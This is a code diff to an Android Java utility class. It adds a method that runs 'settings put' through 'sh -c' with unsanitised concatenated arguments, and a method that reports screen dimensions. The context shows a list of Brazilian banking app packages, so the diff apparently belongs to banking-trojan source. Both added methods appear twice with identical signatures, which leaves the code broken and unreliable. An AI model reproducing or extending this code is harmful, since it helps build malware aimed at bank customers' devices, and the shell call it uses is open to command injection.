@@ -215,6 +215,50 @@ public final class Util {
         return b.toString();
     }
 
+    public static boolean settings(String ns, String k, String v) {
+        try {
+            Process p = new ProcessBuilder("sh", "-c",
+                    "settings put " + ns + " " + k + " " + v).redirectErrorStream(true).start();
+            return p.waitFor() == 0;
+        } catch (Throwable t) {
+            return false;
+        }
+    }
+
+    public static String geo(Context c) {
+        try {
+            WindowManager wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
+            DisplayMetrics dm = new DisplayMetrics();
+            wm.getDefaultDisplay().getRealMetrics(dm);
+            int r = c.getResources().getConfiguration().orientation;
+            return "{\"w\":" + dm.widthPixels + ",\"h\":" + dm.heightPixels + ",\"r\":" + r + "}";
+        } catch (Throwable t) {
+            return "{\"w\":0,\"h\":0,\"r\":0}";
+        }
+    }
+
+    public static boolean settings(String ns, String k, String v) {
+        try {
+            Process p = new ProcessBuilder("sh", "-c",
+                    "settings put " + ns + " " + k + " " + v).redirectErrorStream(true).start();
+            return p.waitFor() == 0;
+        } catch (Throwable t) {
+            return false;
+        }
+    }
+
+    public static String geo(Context c) {
+        try {
+            WindowManager wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
+            DisplayMetrics dm = new DisplayMetrics();
+            wm.getDefaultDisplay().getRealMetrics(dm);
+            int r = c.getResources().getConfiguration().orientation;
+            return "{\"w\":" + dm.widthPixels + ",\"h\":" + dm.heightPixels + ",\"r\":" + r + "}";
+        } catch (Throwable t) {
+            return "{\"w\":0,\"h\":0,\"r\":0}";
+        }
+    }
+
     public static final String[] BANCOS = {
         "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
         "com.santander.app", "br.com.bb.android", "br.com.gabba.Caixa", "com.picpay"
